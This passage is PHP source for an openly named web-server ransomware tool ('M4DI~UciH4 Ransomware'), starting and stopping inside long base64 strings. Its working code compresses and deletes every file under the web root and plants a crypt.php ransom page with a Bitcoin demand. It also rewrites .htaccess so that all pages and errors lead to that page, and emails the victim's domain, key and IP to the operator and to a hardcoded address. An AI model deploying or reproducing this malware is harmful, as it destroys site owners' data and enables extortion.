uOHhsNGZ6UnNPaVRWcHMycE9hcWY4QVRXcFZIb1dTbjdBVFdrazFzbzRLR3YwNkVmcnJKUHM1Y3VMZGVBU2k0OWtvZmhtTXhyb0MwZ0s3MGhvVlhKNnRTcXI4c3dsL2JkRUhHVlZVY01OUjlDN09iZjFEM2xocXYvbllrbml0U243T0t5ajU1ZmVlKzNGU3Z0Q3RmUU1sTmZJR21vK1lhYzlxMDhiUXAzUkZYb2FpZExqVUQxNFRYNHJEWnNQbDQ5azRLMy9kc2NsOWVPVTFhWkd1cW8yZ0UzZTdORmNSU29PeHNQb2dieXVGbU5pS0ZpVVBCaGxQandJK2VsK2hick14blRNcnFzUFpOUFBUeWZhVXNCejRxV3oreWtTeHV4WHo0c28yZ3IwVkp2d0xxQXdIbUFyWHYvN2pOM3N2QUZLcmEzQUttL2d6TUQ3M2IyRTBGT2thZUlSdi9YV1pSL0k3Z2Eramtla2IyMW85NDhIMlJaaGY5bXpFRWZXdGU1QVBXMm84cHI5NWNJSzlEdGJET29zeEhBODcrQWJ1dW81QXYxazIzbjJmbkpITjZwUzNpM2NYNWdTTGJPcDN3eEIxN3JvZkUwaVJmeTdJb1B1UzVXT2VOVnVnQjZXL01majhwalZPWFhnWm1QUzA4ODl2dTk2V0RTdUxqOWN4T2lXTkVyS1FFUkVCRVJBUkVRRVJFQkVSQVJFUUVSRURJcFBaYkQ3UitRL3pNM1pOU3dQZ3djOU81VHEyK1pJOVpqWU5CcXpjRUh6SjAvT1c4UFZzdFQrSlFQWE9wL0FOQTJ1QXAzY0U2M0RmSUEvaEpvTUtmcEZlM0VuRW9QTTBxTEQ4SkdOMjZlZW9uUXNWOXlvL3RPaDA4SVBwS3NSeHFvU2VWNjlOcUJ0NUVFKzA1NU5pL2pzYmJhQVlmVnJwU2J6SUNPdi9BQmYzbURzYkZuNkp0QnVKR0pvZXh4SS9ML2pOYnR5b3c3RmhvMUJub05iazFHb0tsRWVacDFBUHV0MGw3WmVWS2VLcERUdDJvMis3VVlnLzFDUjNGSnZ1WGhyWWJEcXhBQ1VCbXZ4eWpNUVBrUGJ4a0kzcjMrVkdLVVVETUc1bXdYajA0NjhwTmQ0YUQwY05VVmRDYUNnVzZCZFo4OXJVeTFNekM5bXZZOENRZWZoS3dqTlMzdDNmY1Rid3hlVU9SZW9wVTI0OXdxZitLdjd6VjRscmxtSElDL24yck1ENDZWRjlwRnZoNXRXbytPRlhLQURVTndpNVVYTmg4VmV3R2dHZ05wSjltVWkzWmh2L0FOS1ZWaUR5c3RES1BuSnMxVldwUnZtZ3B2VGNjRFZTcDZxbFUvaUpGS09FQ1BWUWNGY05mbDlZcS84QVRKRHZkVjdUNkd2NzZOL3V5a2ZpVDd6VVk0V2FwMWRYL3FJdCtNUmpsUm8yVkZQRVp3ZlVVeC9lWXRCUmxZRTJzUlk5Q09GL0RXMGttS3dnT2FwYmt6ZUFzTC9QS1pIMXc1RkJtUE1oZncvTW1kVXRaWHBrRTZXOE9uL1V0VDMycHRia09IaFBFcGhFUkFSRVFFUkVCRVJBUkVRRVJFQktnU2t2VW15Ni9hNWVIajV3TCtLYktvcGpqZk0zbmJSZlFmTW5wTVNVSmwxVTB2NS9yOWRZRXIzU1VpbXJqaXJtMzh3SVlmbjdUcXUwc0dEa2FtYkE5MWZBdU8wcFA1Zlc5eDRUbSt3OHFJbUhQMXdpVmoxdVN4eW5vY2oyblV0aHV0YkNaU2UvVEFway91cVdIWlA1TFVSZlFOT1dhb2d2eEZxZGhpUld5M29ZeEZxa2Z1MVVKRFc4Vll1cC9ocTI2U3h1enRtamlLeUt3S3NwUEhVRy9EVWNiRzAzMitySXl0UXJxY3JFVjZYTmtjZDExVWZhc1FWWkJ4RmlPOWJOQ04yZG5WbTdURUJBVG11b1hSVDlxNkRoYnA3UlBUZE8vYnc3TjdTa2c2MHdEN1RuZGY0WGpGMU80dVFEaS9EcWJEcWJrenBHejk0bHEwcVpwYXFRbzRhalRYTjBtMEcxYVZKQWFqS3JNU0FvK3N4NktvMUo4cHNTZzJ5dDBLT0JCVkFvYmdXYnJsS2p5K3RNZkdHbWE2NUNwc0s5ckcvZEdIcHZ5OEZFOTc1YllyVjZaRkNtYU5PcUhQYjFpVnN0TmdIeW9POW1GaWJmd3lLL0RiRGx5ejN2bStrTUw4VG1EVVI1Q3lySXZ0MThMcmRicmJDbnRjQ25SbXY0QktlWW41Q1llMEZKeW5pV1JRYmVSL3NQYWIvYTlFTldKdDlWS2lEenFsRXVQSEtyVFZpbGN0WTZaMlVlQUFCYnk3cXVmdkxHMG9UdHhzcVZFSEpWWDUzWStWZ2Rla2pXMENCaEF2TU5USi8xTzBlM3BhYi9BSGlxQ3pBbldvMXRQc29BMS9ld1dRMnZpOHdjbmc3WDhpb0dVK3hZZXM2NG9yQWlJbE1JaUlDSWlBaUlnSWlJQ0lpQWlJZ0lpSUhwRnViVE1WMUREUzRVQTI2Z2E2L00yOHBZdGxIaWZ3bGVSSjUvZ1AwUGFCbDRIYUxpdjJ4TjJGMko2K0h2YWRUM1MydU94YkVVd0NBTXJvVFpXREtiMDN0cU84aWdIK05TSnlEZ0xkZVBwSnB1RmlpaXN0OU1SWG9KYm9LU3RVcU40QVhUejFrNVRjVk9rNjJrMURHVVFxc0dyVW16VTFZaFdmUUJxVGNpYldPbkhLckRsTmxzVEdVYlpYSVEyK3EzZEtubmNOYWNyeDdGaFdJR1h2dnc2ZG95alR5dC90bUxYMmcrSVJGYW9SVVFXQUorc05SY01UNlduTzQyVHBXT3NyMjZwVTNucFUyZWxobXBnL2JyUHBoNlJ0cG5JMUpOckFEbnBlUWJhWHhJclpyNFBPckhzWEwxU3IxRnFwbkQ1RGF3cHVyS01tZ0ZqWUM1dkZLMWV1S1pvczFrVXNDQWREM2dTRGJSaG1XK3ZQaFBXeTZWRU12YnN5VXpxeFVabnQwVUhRbmh4amVub3g0ZC9rU3pZdUtyMTZMMThXd3FVYU5kOFFGSkF6WWlwWTlrdDlRR0Y3S3ZqT2g3UHd0TForRVJpTzhtR1ZTUnpkbkRra2VZcUg3cG5JMzJzYXVXblRRTFRRTGxwajdUSXBIYXQvRVJjZXM2cmpsT01GQ21XL1ovVmUzUHVxZVBKdUE5RzZ5ZDd2WnpZZU9FMWVxM3FiTHFWMkdVZDIvZWZsYnNRTk9wQnFzZW5jbVpWMkN0UEQyQ2t2WjlUcVNhckVrbjBNM2RUYXRIRHBrc2JvcWpJaWwyNERRS29KTWdlOXZ4R3hLZ3BodG00aHpyMzNSZ28xUEJWQkowSFVjWnN4Mjh1MEMzMjNkcW9sMUJKY3N4NTJXeWdBZXplODVvNEkwblVsK0sxNm1URjRSV1FkMG1tU0tnSTQ2UG9kYjZYRXo5cmJvNExIMERpY0M0UFcyaktiZlZkZUlQbk9zNlpYRzRtYnRUWnRTZzVTb3BCSFBrZktZVXBoRVJBUkVRRVJFQkVSQVJFUUVSRUJMdElEaWVYTHFmN1MxRUQyTHNmRXk5VklGZ09JQUg1L25MTk5yRy9nZndudCtOK29nZW1HaDhMZlA5R1NiZDljdFNtdXZjcFZXdDFlcW1VZXVXb1BhUnpDcmRsSEptQVBseG00MmZpN1ZsWUhpeEZ2NWdRdjY4SmxHOXJVZjJ6b2Z0NTdqd2F6QS83YXBIbklsak1PUXhCNUUraDRYSGdkSk45NkJaYVdKVDdHVytsN29WNTljMU5oNkxOVnZGUnAxS2ExNlp5NXU2L01aMUh5dUw4ZjNUNGtaSzJ0TGsvWWduamZYWFhYL0V4Y1l3QkE1VzBseWlRVUlINnROYzVQUGxPZU9QYjM4M0xyQ2ErWi9qSncySXk2ampiUTlQR2R2K0V1eTN4Rk5TVGFuVGRpeDV1VGxOZ2ZNSDBuRmRoWUZxMVZVVVhKTnA5YmJuYklYQzRTbFNVV0lVRnZNaldiWnZKd3VWbkYzOCttMnA0ZFJld0F2eDhmUHJNYkZZT21RZEFEMW1iYWEvYXVFekRNRFpoTHNlZU9XZkVUY0JNVm1xVXdGeElCSVlhQ3JiN0xqcjBhY2MzYzI3WDJmaU8wUzRLa3JVcHRvSEFQZVJ4eVBIWGtaOUh0VU45ZU00MThZOWhDbmlGeFNDeTE5SHR3RlFEajZnZTRNWTM0YlV1Mi9zbkQ3UXc2NGlpQVZxTGNkUWVhbm93Tng1aWNYMnBzOTZMbEdIbDR5V2ZEWGUzNkxVTkNxMzdDc2VKNFUzNEIvQlRvRDZIbE4zOFN0akFqdEZGalluMUhFUjZZNVpFUktZUkVRRVJFQkVSQVJFUUVSRUJFcXEzbDNFNFY2WnkxRVpHNk1wVTI2Mk1DelBRYWVaV0Jjb1ZDckE5Q0RMeHJDOXdmRHhGaVNEK3ZHWWtRSk4vd0RmbHFRUTJOaFlnNmdyY20zb1RjSGx3NFRXNFBhaFFNaFhOVGZSbEo2Y0NEeUk1SCs1dnE1VUM4YUd3d2pxcm14SlhYam9mQy9qTUp4ckxsSkNyV1lFSG9SWWpUcEx1ejhJOWFzbEpCZDNZS1BYbjdTZGR1MXlsd2svWFYvZ1p1MTJsVTFtWHVvT1BVOGgrUHRPL0FUUWJrYnVyZ2NLbEVhdGE3bnF4R3NrRVl6WHRuTG5Nc3V2VTlFd01YWE9vdE0rYTdhZUpWYkFrWE1aT2NSaXN2ZU1qdS9tekJpY0RWUzEyQXpwL01tdnpGeDZ5VjR4QUNUeXNKQVBpRnRtcFN3anRSY28xMEFZY2RXRng2aVRHdUZ6bys3TzNQcE9FYkQxVCsxb2k2c2VMVStIdXVnOGlQR2M1WnI2OVo3dzJJWkdES2JFVHBVc3JiV0U3S3FWNUd4SGtaZ1Mvak1VMVE1bTQydExFQkVSQVJFUUVSRUJFUkFSRWxYdzJ3dUdxNHdVc1NBVnFJNnBmaDJtaEh5RFc4YlFOVHV6aVJTeGVIcUVBaGF0TW0rb3RtRjVNUGpJdi9tRS93QUlzWmpiNzdrMWNLK2FtTTFNbTRJRnJhK0U4N3piVHA0bW5TWTVqV0NBMXJpMXNvQ2p5ek13MW5PNVBSeDhlN2YxRWpneUZ6SGdUYS81ZUI4SXh1ejNwMnpEUmxES2VSQi9NY3hNMmlNM2RBdnB5NWFIWFQwa3orSmRPblJ3MkNvQkFDUzd0MUdWVlVEMXpIMmlaWGF1WGp4eDZqbWtUWUNnTDNLMkI2Zjl6elV3eW5WZEJOODRuK3RuWnVNalpPNzliRVVxMWFtVXkwUUMyWnJFM0JObDA4T2RwUEgyTnM3QlZNNHpHdGgxN1JReHpJL2NBUm5CRmdlMFlXQXRxdlNSQWJYZjZQMkZPbUFEVENWQ3E5NGtPeEJMRGpvZWZDNW1Iak1YVnJPNzFHK3ZiTjkzZ0xlY1dzeDQvd0FidXZ2SlR4T0dxVThUVFZzUmNHbldzTTlzNEpVc05ScGZUaEpOOER0Z0kyT3FWM0diNk9pTlRBMUdhc0RZbnhWYmkzOFhoT1pwVHltLzR6dDMvd0FkYUZoaTJQRTlsN0FOTWwrbFo0WHgzWTdPSldVbURqY2NGSGpMdDA4eS9qTVNFVWt6bnUzZHJGNm90Tmh0YmFMRUc1MEVnK0l4dzdRc1RKOXFTWGIyMmhUb2hTZTgxaE9hL0VmSFd3eVU3L1hZSDIxbWczdzNvZXJXc2g3cS9PYVhiTzFXcjVMOEZGcHNqTFd0bElpVXdpSWdJaUlDSWlBaUlnSWlJQ2JEWUdKN1BFVW50ZXpqUWNUZlRUM212bnBHSU54eEVENlJvNG13SzFyTlJLaGxxTVJiVUc2Tnp1QU9OckVlTTRqdHZFSzlSNmxNRWRvelpRTGp1QTJCT21wTmlmQzA2SnU3dlhReGVFYWpVdDJvcE1HUW0zYVdYaXZpZnhuTXNQaUxQbk9wVUFxTGFYYlhnT1F6SDVUaDNIcjROWGNkRytHbXhhSW9kcXdEMUhMWEdoeUFFcUFmSFFuMW1rK0srQ3F0VXBQOWhhWVFEVzk3a2s4TlFSYjJuUmZoWGdBS0N1b0daOVQ1bm5KSHZwdXQ5S1N6c3VnME5yV2liOXhPY3htV3NyMCtZTUhRcVAzYWZlUDd0N0gyUEgwbHl0VHFKZFhRcVFPZW50Sk52WHVYVW9NV3BObllha0lEZnpGaE5DTnQxUHExMUxqeEZtdDBOOUQ2eTliNzBZOGx4dXQ5TE5PdFpMVzh5WmJZM0Z4eThQN1RQZmFHQ09vb3VyVzZqTGZ5bEJqUmlHV2lnRkttU0xubVI0K01tWTkrblMveUo0NmU5aGJOZkUxUW1YdXFSZno1TFBwZjRmN3ZMaEtCQStzN1hQb0xBZmpJUHU5dWlsR2xRN0JnN0ZsSnNiMkhIdlc1enI5TmJBQ1ZqSnR4NU9TNVk5MzJwVTRTTWJXeEFCdGViamJPTHlLYkhXUUhhMjFiWDExaSszS01UZURHZ0tSZWNwMjV0b2d0WStFa2U5ZTFySXhKNUdjdXExU3h1VHFaVWpMWGhqZVVpSlRDSWlBaUlnSWlJQ0lpQWlJZ0lpSUNJaUI3UnlDQ0NRUndJMEk4ak56c29LemQ3aGw5N0gvRTBjeU1OaVNyQThiY3VvNWlUbE54MTRzL0d1NWJqN2RGSkFWMUFHZ0hNOGdKMGZBRnFnVnE3YW5YS09BNjI4Qnc5SnduWUcxa1ZxQVMxbURHM1Mxdnl2T3Y3SjJrT3pKNTVRbzk5WkVtb2NsbHU0MiswZDJhZFVFcXpBMjB0dzlad2pmTFl0cXJMOW9mWklzZm54bjBiaE1TQ3EzOEphMmpzYWpXc2FpQW5yTnl4OHAwY1hKNFhiNWR3dTVyMUZ6RU1sMlZWSElra0Q4NTFuY0RjR2dnZENHTm16WE5yazNzUjZXK2NsTzE5MmhudytTeXJUcTUyNlpWNEFlc2xPR3d5cGZLTFhKUHZObS9TYzhwYnZUMWg4T3ROUXFnQUNZMlB4b1FFM0V1WTNFaFFkZFpBTjR0cEVBNnhhbU1YZUxlTXNTb05wejdiTzE3WDFsemEyUHRmcklCdGZhUmRpQWRCTmthYmEybTFWclgwSHpNMWtSS1NSRVFFUkVCRVJBUkVRRVJFQkVSQVJFUUVSRUJFUkF6OWxZNDA2aW5rRDdYblo5MU5yclVVQzRuQ1p2TmdiZmVndzFOcGxqZHZwL1l1T0JGbTVDYmw4ZmxJSEkybkw5MU40VXJnZDRYTW1lUHhQZEI4cEhwcVIxY0tqc3JrWEs4UDhUemo2NVJiaVkyenNlcHA2bmhlYUhhVzNWN3dKc05adTJhVzlxYlMxNHlCYnpiVVVjVFBlMTlyaTVOOUJ6bk45dGJhN1JtWW13R2dFU05XOTRkckE2THhNakpsWGNrM004eTBrUkVCRVJBUkVRRVJFQkVSQVJFUUVSRUJFUkFSRVFFU3NRS1JLeEEyZXhkczFNTzRLazI2VHIyeE45NmRhbFpqcnBPSFM3aDZyS2JxU1BLWlp0dTMwQ20zUUJvM0dhYmFXUERhMzBrRjJWaktqS016RXpZNG1vY3ZHVG8yMU84MjJTZTZzaVR1VHhtNDIwYld0cGU5LzhBTTAwdGlrU3NRS1JLeEFwRXJFQ2tTc1FLUkt5a0JFUkFSRVFFUkVELzJRPT0pOyBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7fQ0Kew0KLXdlYmtpdC1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIC1tb3otYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DQogICAtby1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCiAgIGJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KfQ0KLm10ew0KICAgIGJvcmRlcjoxLjJweCBzb2xpZCBhcXVhOw0KICAgIGJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0KICAgIGNvbG9yOiBsaW1lOw0KICAgIHdpZHRoOiAyMDBweDsNCiAgICBoZWlnaHQ6IDI1cHg7DQogICAgZm9udC1mYW1pbHk6IFVidW50dTsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQouYnRjYWRkcmVzc3sNCiAgICBib3JkZXI6MC44cHggc29saWQgZ3JleTsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMUExQzFGOw0KICAgIGNvbG9yOiB5ZWxsb3c7DQogICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgIHdpZHRoOiA0MDBweDsNCiAgICBoZWlnaHQ6IDI2cHg7DQogICAgZm9udC1zaXplOiAxNzsNCiAgICBmb250LWZhbWlseTogVWJ1bnR1Ow0KfQ0KLmVtYWlsew0KICAgIGJvcmRlcjowcHg7DQogICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7DQogICAgdGV4dC1hbGlnbjogY2VudGVyOyANCiAgICBjb2xvcjogYXF1YTsNCiAgICB3aWR0aDogMzEwcHg7DQogICAgaGVpZ2h0OiAzMHB4Ow0KICAgIGZvbnQtc2l6ZTogMjguNTsNCiAgICBmb250LWZhbWlseTogSWNlbGFuZDsNCn0NCnBsYWNlaG9sZGVyew0KCWNvbG9yOiB5ZWxsb3c7DQp9DQouZ2Fzew0KCWJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0KCWNvbG9yOiBnb2xkOw0KCWJvcmRlcjogMS4ycHggc29saWQgZ29sZDsNCgl3aWR0aDogNzBweDsNCn0NCjwvc3R5bGU+DQo8Y2VudGVyPjxicj48YnI+PGJyPjxicj48Zm9udD4NCjxzcGFuIHN0eWxlPSJmb250OiA0MHB4IE1lcmllbmRhO2NvbG9yOnllbGxvdzsiPllvdXIgV2Vic2l0ZSBIYXMgYmVlbiBFbmNyeXB0DQo8aHIgd2lkdGg9IjkwJSI+PHNwYW4gc3R5bGU9J2ZvbnQ6IDEwcHggaWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHg7Jz58IFBheW1lbnQgQWRkcmVzcyB8PGJyPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iYnRjYWRkcmVzcyIgdmFsdWU9InBheW1lbnR6IiByZWFkb25seT48YnI+DQo8c3BhbiBzdHlsZT0nZm9udDogMjVweCBpY2VsYW5kO2NvbG9yOnJlZDt0ZXh0LXNoYWRvdzogMHB4IDBweCAzcHg7Jz5NYWtlIGEgcGF5bWVudCBvciBJIGRlc3Ryb3kgeW91ciB3ZWJzaXRlIGFuZCBpdCB3aWxsIG5vdCByZXR1cm4gdG8gbm9ybWFsLCBieSBtYWtpbmcgYSBwYXltZW50IEkgd2lsbCBnaXZlIHlvdSBhIHBhc3N3b3JkIGFuZCB5b3VyIHdlYnNpdGUgd2lsbCByZXR1cm4gdG8gbm9ybWFsIDopDQo8YnI+PGJyPg0KCTxzcGFuIHN0eWxlPSdmb250OiA5cHggaWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHg7Jz58fiBQYXNzd29yZCB+fA0KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXNzIiBjbGFzcz0ibXQiIHBsYWNlaG9sZGVyPSJFbnRlciB5b3VyIGRlY3J5cHRpb24ga2V5Ij4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJnYXMiIHZhbHVlPSJEZWNyeXB0Ij4NCjwvZm9ybT4NCjxicj48YnI+DQo8Ym9keSBiZ2NvbG9yPWJsYWNrPjx0ZCBhbGlnbj1jZW50ZXI+DQo8c3BhbiBzdHlsZT0iZm9udDogMTNweCB1YnVudHU7Y29sb3I6Z29sZDsiPlsgTTREMSBSYW5zb21XYXJlIF0NCjxociB3aWR0aD0iNzAlIiBjb2xvcj0icmVkIj4NCgk8c3BhbiBzdHlsZT0nZm9udDogOC41cHggSWNlbGFuZDtjb2xvcjphcXVhO3RleHQtc2hhZG93OiAwcHggMHB4IDJweDsnPjw6OiBDb250YWN0IE1lIDo6Pg0KPGJyPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZW1haWwiIHZhbHVlPSJ4WHggdW5kZXJ4cGxvaXRAZ21haWwuY29tIHhYeCIgcmVhZG9ubHk+PGJyPg0KPG1hcnF1ZWUgYmVoYXZpb3I9ImFsdGVybmF0ZSIgc2Nyb2xsYW1vdW50PSI1MCIgd2lkdGg9IjQ1MCI+IDxmb250IHNpemU9IjQiIGNvbG9yPSJzaWx2ZXIiPjxiPl9fX19fX19fX19fX19fX19fX19fPGZvbnQgc2l6ZT0iNCIgY29sb3I9InJlZCI+PGI+X19fX19fX19fX19fX19fX19fX19fX188Zm9udCBzaXplPSI0IiBjb2xvcj0ic2lsdmVyIj48Yj5fX19fX19fX19fX19fX19fX19fXzwvZm9udD48L21hcnF1ZWU+PGJyPg0KPC9odG1sPg==");
$q = str_replace('kontol', md5($_POST['pass']), $file);
$w = str_replace('djoatmail', $_POST['email'], $q);
$e = str_replace('paymentz', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "#M4D1 RansomWare\n
DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
}
function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}
if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
//change email with your mail
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
$to=$_POST['email'];
$subject='M4DI~UciH4 Ransomware Informasi';
$message="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];
$too='indomilk87@gmail.com';
$title='M4DI~UciH4 Ransomware Informasi';
$pesan="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];
if(mail($to,$subject,$message))if(mail($too,$title,$pesan)){echo 'Password Saved In Your Mail !!!';}else{echo 'Password Not In Your Mail !!!';}exit();
}
?>
	<pre>
<h2><center><font color=yellow>M4DI~UciH4 Ransomware</h2></font></pre></center>
<form action="" method="post" style=" text-align: center;">
    <label>Key : </label>
<input type="text" name="pass" class="inpute" placeholder="make a password">
      <select name="method" class="selecte">
         <option value="kontolbapakkau">Encrypt</option>
      </select><pre><br>
<label>Your Email : </label>
<input type="text" name="email" class="inpute">
<label>Your Payment Address : </label>
<input type="text" name="btc" class="inpute">
	<br>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
</form>
</div>
<?php
 }
if(isset($_GET['do']) && ($_GET['do'] == 'ransom3')) {
 error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
    if (strpos($filename, '.crypt') !== false) {
    return;
    }
    file_put_contents($filename.".crypt", gzdeflate(file_get_contents($filename), 9));
    unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPk00REl+VWNpSDQgUmFuc29td2FyZTwvdGl0bGU+DQo8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pbWcuZGV1c20uY29tL2RhcmtyZWFkaW5nL2JoLWFzaWEtZmFjZWJvb2stcHJvZmlsZS5wbmciPg0KPHN0eWxlPg0KaHRtbCB7DQpiYWNrZ3JvdW5kOiBibGFjazsNCmNvbG9yOiB3aGl0ZTsNCn0NCmlucHV0IHsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGNvbG9yOiB3aGl0ZTsgYm9yZGVyOiAxcHggc29saWQgd2hpdGU7IH0NCjwvc3R5bGU+DQo8P3BocA0KZXJyb3JfcmVwb3J0aW5nKDApOw0KJGlucHV0ID0gJF9QT1NUWydwYXNzJ107DQokcGFzcyA9ICJqYW5jb2tqYXJhbiI7DQppZihpc3NldCgkaW5wdXQpKSB7DQppZihtZDUoJGlucHV0KSA9PSAkcGFzcykgew0KZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpew0KCWlmIChzdHJwb3MoJGZpbGVuYW1lLCAnLmNyeXB0JykgPT09IEZBTFNFKSB7DQoJcmV0dXJuOw0KCX0NCgkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOw0KCWZpbGVfcHV0X2NvbnRlbnRzKHN0cl9yZXBsYWNlKCcuY3J5cHQnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7DQoJdW5saW5rKCdjcnlwdC5waHAnKTsNCgl1bmxpbmsoJy5odGFjY2VzcycpOw0KCXVubGluaygkZmlsZW5hbWUpOw0KCWVjaG8gIiRmaWxlbmFtZSBEZWNyeXB0ZWQgISEhPGJyPiI7DQp9DQoNCmZ1bmN0aW9uIGRlY2RpcigkZGlyKXsNCgkkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOw0KCQlmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgew0KCQkJaWYoaXNfZGlyKCRkaXIuIi8iLiRmaWxlKSl7DQoJCQkJZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsNCgkJCX1lbHNlIHsNCgkJCQlkZWNmaWxlKCRkaXIuIi8iLiRmaWxlKTsNCgkJfQ0KCX0NCn0NCg0KZGVjZGlyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pOw0KZWNobyAiPGJyPldlYnJvb3QgRGVjcnlwdGVkPGJyPiI7DQp1bmxpbmsoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOw0KdW5saW5rKCcuaHRhY2Nlc3MnKTsNCmNvcHkoJ2h0YWJhY2t1cCcsJy5odGFjY2VzcycpOw0KZWNobyAnU3VjY2VzcyAhISEnOw0KfSBlbHNlIHsNCmVjaG8gJ0ZhaWxlZCBQYXNzd29yZCAhISEnOw0KfQ0KZXhpdCgpOw0KfQ0KPz4NCjwhZG9jdHlwZSBodG1sPg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5IYWNrZWQgQnkgTTRESX5VY2lINDwvdGl0bGU+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9Sm9sbHkgTG9kZ2VyJyByZWw9J3N0eWxlc2hlZXQnPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPiAgICAgDQp7DQphbGVydCAoIkhhY2tlZCBCeSBNNERJfnVjaUg0Iik7DQphbGVydCAoIk9wcHNzLCB5b3VyIHdlYnNpdGUgaXMgbG9ja2VkIik7DQphbGVydCAoIkRvbid0IFBhbmljIGFkbWluIDopIik7DQphbGVydCAoIllvdXIgc3lzdGVtIHNlY3VyaXR5IGlzIHZlcnkgd2VhayIpOw0KfTwvc2NyaXB0Pg0KDQogDQo8Y2VudGVyPjxicj4NCg0KDQoNCjwvc3R5bGU+DQoNCiA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogICA8bWV0YSBjb250ZW50PSIjIEhla2VMICMiIG5hbWU9ImRlc2NyaXB0aW9uIi8+DQogICA8bWV0YSBjb250ZW50PSJbIEJsYWNrSGF0IF0iIG5hbWU9ImtleXdvcmQiLz4NCiAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCgkJDQoJYm9keSB7DQo8c3R5bGUNCmJhY2tncm91bmQtaW1hZ2U6dXJsKCcnKTsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOw0KCQkJCWJhY2tncm91bmQtcmVwZWF0Om5vLXJlcGVhdDsNCgkJCQliYWNrZ3JvdW5kLXNpemU6IDEwMCUgOw0KCQkJCWJhY2tncm91bmQtcG9zaXRpb246dG9wIGNlbnRlcjsNCgkJDQp9PC9zdHlsZT4JDQoJICA8Ym9keSBvblVubG9hZD0iVXNlckV4aXQoKSI+DQoJICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vaHRtbGZyZWVjb2Rlcy5jb20vY29kZXMvcmFpbi5qcyI+PC9zY3JpcHQ+DQoNCiAgICAgPC9oZWFkPg0KDQo8c2NyaXB0IGxhbmd1YWdlPUphdmFTY3JpcHQ+IG1lc3NhZ2U9IkFudGkgQ29wYXMgTmplbmshISEiO2Z1bmN0aW9uIGNsaWNrSUU0KCl7aWYgKGV2ZW50LmJ1dHRvbj09Mil7YWxlcnQobWVzc2FnZSk7cmV0dXJuIGZhbHNlO319ZnVuY3Rpb24gY2xpY2tOUzQoZSl7aWYgKGRvY3VtZW50LmxheWVyc3x8ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQmJiFkb2N1bWVudC5hbGwpe2lmIChlLndoaWNoPT0yfHxlLndoa